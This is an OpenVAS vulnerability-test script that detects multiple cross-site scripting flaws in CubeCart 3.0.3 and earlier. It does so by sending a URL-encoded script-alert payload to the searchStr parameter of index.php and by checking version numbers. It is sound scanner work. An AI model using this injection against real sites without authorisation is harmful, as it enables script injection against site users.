###############################################################################
# OpenVAS Vulnerability Test
# $Id: cubecart_xss.nasl 12159 2018-10-30 04:28:13Z ckuersteiner $
#
# Multiple CubeCart XSS vulnerabilities
#
# Authors:
# Josh Zlatin-Amishav <josh at ramat dot cc>
#
# Copyright:
# Copyright (C) 2005 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:cubecart:cubecart";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.19945");
  script_version("$Revision: 12159 $");
  script_cve_id("CVE-2005-3152");
  script_bugtraq_id(14962);
  script_tag(name:"last_modification", value:"$Date: 2018-10-30 05:28:13 +0100 (Tue, 30 Oct 2018) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("Multiple CubeCart XSS vulnerabilities");
  script_category(ACT_MIXED_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2005 Josh Zlatin-Amishav");
  script_dependencies("secpod_cubecart_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("cubecart/installed");

  script_xref(name:"URL", value:"http://lostmon.blogspot.com/2005/09/cubecart-303-multiple-variable-cross.html");

  script_tag(name:"solution", value:"Upgrade to CubeCart version 3.0.4 or later.");

  script_tag(name:"summary", value:"The remote version of CubeCart contains several cross-site scripting
  vulnerabilities to due to its failure to properly sanitize user-supplied input of certain variables to
  the 'index.php' and 'cart.php' scripts.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_banner");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");
include("version_func.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! infos = get_app_version_and_location( cpe:CPE, port:port, exit_no_version:FALSE ) )
  exit( 0 );

if( ! safe_checks() ) {

  dir = infos['location'];
  if( dir == "/" )
    dir = "";

  vtstrings = get_vt_strings();
  xss = "<script>alert('" + vtstrings["lowercase_rand"] + "');</script>";
  exss = urlencode( str:xss );

  url = string( dir, "/upload/index.php?", 'searchStr=">', exss, "&act=viewCat&Submit=Go" );

  req = http_get( item:url, port:port );
  res = http_keepalive_send_recv( port:port, data:req );

  if( res =~ "^HTTP/1\.[01] 200" && xss >< res ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

ver = infos['version'];
if( ! ver )
  exit( 0 );

if( version_is_less_equal( version:ver, test_version:"3.0.3" ) ) {
  report = report_fixed_ver( installed_version:ver, fixed_version:"3.0.4" );
  security_message( port:port, data:report );
}

exit( 0 );
